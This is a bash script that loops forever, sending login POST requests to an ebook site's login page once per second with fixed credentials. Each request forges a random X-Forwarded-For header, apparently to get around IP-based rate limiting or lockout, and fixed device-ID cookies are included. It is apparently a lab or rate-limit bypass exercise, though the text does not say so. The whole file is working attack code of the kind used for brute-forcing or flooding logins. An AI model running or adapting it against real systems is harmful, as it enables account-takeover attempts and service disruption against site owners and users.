#!/bin/bash
while true; do
    # for MacOS
    oc1=`jot -r 1  1 255`
    oc2=`jot -r 1  1 255`
    oc3=`jot -r 1  1 255`
    oc4=`jot -r 1  1 255`
    ipaddr="$oc1.$oc2.$oc3.$oc4"
    xff="X-Forwarded-For: $ipaddr"
    postdata="next=%2F&username=bien&password=somepass&remember_me=on&submit="
    didA="AaZHN2BBBBBBjAY3fLSqDLPwaTwCq6aI"
    didB="AS5q4jNm2lKg4SXCyJRF0AQ8vTwCq6aI"
    cookie_1="_imp_apg_r_=%7B%22diA%22%3A%22$didA%22%2C%22diB%22%3A%22$didB%22%7D"

curl -k -i 'https://ebook.bienlab.com/login' \
    -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/85.0' \
    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' \
    -H 'Accept-Language: en-US,en;q=0.5' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H 'Origin: https://ebook.bienlab.com' \
    -H 'DNT: 1' \
    -H 'Connection: keep-alive' \
    -H 'Referer: https://ebook.bienlab.com/login' \
    -H 'Upgrade-Insecure-Requests: 1' \
    -H "${xff//[$'\t\r\n ']}" \
    --cookie $cookie_1 \
    --data-raw $postdata
sleep 1
done

